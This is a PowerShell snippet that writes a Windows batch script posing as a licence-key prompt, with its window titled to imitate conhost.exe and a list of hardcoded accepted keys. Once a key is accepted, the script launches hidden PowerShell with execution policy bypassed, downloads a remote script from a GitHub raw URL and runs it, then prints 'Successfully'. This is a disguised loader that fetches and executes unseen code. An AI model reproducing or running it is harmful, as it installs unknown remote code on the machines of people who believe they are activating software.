$path = "$env:TEMP\run.bat"

@"
@echo off
mode con: cols=60 lines=10
title C:\Windows\System32\conhost.exe
color 0F
cls

:: ซ่อน cursor (หลอกๆ)
echo off >nul

:input
set /p key=Enter license key: 
set key=%key: =%

if "%key%"=="Nel" goto ok
if "%key%"=="King" goto ok
if "%key%"=="finalpremium-27BHJ" goto ok
if "%key%"=="finalpremium-8K2LM" goto ok
if "%key%"=="finalpremium-X91QP" goto ok
if "%key%"=="finalpremium-55TGH" goto ok
if "%key%"=="finalpremium-AB12Z" goto ok
if "%key%"=="finalpremium-9PLK3" goto ok
if "%key%"=="finalpremium-QW77E" goto ok
if "%key%"=="finalpremium-ZX90N" goto ok
if "%key%"=="finalpremium-MN45R" goto ok
if "%key%"=="finalpremium-LL22X" goto ok

goto input

:ok
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"

cls
echo Successfully
timeout /t 2 >nul
exit
